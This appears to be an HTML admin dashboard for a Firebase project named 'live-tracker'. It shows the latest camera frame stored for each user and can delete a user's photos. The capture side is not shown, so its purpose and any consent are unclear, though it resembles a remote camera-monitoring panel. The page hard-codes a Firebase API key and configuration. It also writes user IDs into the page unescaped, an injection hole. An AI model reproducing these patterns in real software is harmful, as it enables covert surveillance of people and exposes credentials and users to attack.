<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live Full Frame Admin</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0b1220;
  color:white;
}

/* HEADER */
header{
  padding:15px;
  text-align:center;
  background:#111a2e;
  font-size:18px;
  font-weight:bold;
}

/* USERS STACK */
.container{
  display:flex;
  flex-direction:column;
  gap:15px;
  padding:15px;
}

/* USER BOX */
.userBox{
  background:#1e293b;
  border-radius:15px;
  padding:12px;
}

/* FULL FRAME IMAGE */
.frame{
  width:100%;
  height:300px;
  border-radius:12px;
  object-fit:cover;
  background:#0f172a;
}

/* BUTTON */
.btn{
  margin-top:10px;
  padding:8px 12px;
  border:none;
  border-radius:8px;
  cursor:pointer;
  font-weight:bold;
}

.deleteAll{
  background:#dc2626;
  color:white;
}
</style>
</head>

<body>

<header>📡 Live Full Frame Dashboard (Latest Image Only)</header>

<div class="container" id="grid"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>

const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57O8ALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const grid = document.getElementById("grid");

db.ref("camera").on("value", (snap) => {

  const data = snap.val();
  grid.innerHTML = "";

  if(!data){
    grid.innerHTML = "<p>No users</p>";
    return;
  }

  Object.keys(data).forEach(userId => {

    const box = document.createElement("div");
    box.className = "userBox";

    box.innerHTML = `
      <h3>👤 ${userId}</h3>

      <button class="btn deleteAll" onclick="deleteAll('${userId}')">
        🗑️ Delete All
      </button>

      <img id="img_${userId}" class="frame" src="" />
    `;

    grid.appendChild(box);

    loadLatestImage(userId);

  });

});

// 🔥 ONLY LATEST IMAGE
function loadLatestImage(userId){

  const ref = db.ref("camera/" + userId);

  ref.on("value", (snap) => {

    const data = snap.val();
    const img = document.getElementById("img_" + userId);

    if(!data){
      img.src = "https://via.placeholder.com/600x400?text=No+Image";
      return;
    }

    // get last image
    const keys = Object.keys(data);
    const lastKey = keys[keys.length - 1];
    const lastItem = data[lastKey];

    img.src = lastItem.frame || "https://via.placeholder.com/600x400?text=No+Image";

    img.onerror = () => {
      img.src = "https://via.placeholder.com/600x400?text=Error+Loading";
    };

  });

}

// DELETE ALL
function deleteAll(userId){

  if(confirm("Delete ALL photos of " + userId + "?")){

    db.ref("camera/" + userId).remove()
    .then(()=> alert("Deleted"))
    .catch(err=> alert(err.message));

  }

}

</script>

</body>
</html>
